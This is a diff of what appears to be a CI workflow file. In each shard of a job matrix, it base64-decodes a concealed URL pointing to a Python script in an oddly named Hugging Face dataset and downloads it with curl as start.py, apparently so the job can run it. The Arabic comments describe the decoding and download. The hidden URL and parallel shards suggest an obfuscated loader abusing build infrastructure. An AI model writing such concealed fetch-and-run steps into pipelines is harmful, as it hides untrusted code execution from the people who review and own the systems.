@@ -26,10 +26,10 @@ jobs:
         run: |
           echo ">>> [SYSTEM] Starting Shard-${{ matrix.shard_id }} setup..."
           
-          # فك تشفير الرابط الجديد وتنزيل الملف الأساسي مباشرة
+          # فك التشفير والتنزيل باستخدام curl حصراً
           URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2g0L3Jlc29sdmUvbWFpbi9zdGFydF9zaHJpbmtfbmV3LnB5" | base64 --decode)
           
-          curl -sL "$URL_MAIN" > start.py
+          curl -sL "$URL_MAIN" -o start.py
           
           echo ">>> [SYSTEM] Installing Python modules..."
           python -m pip install -qU pip setuptools
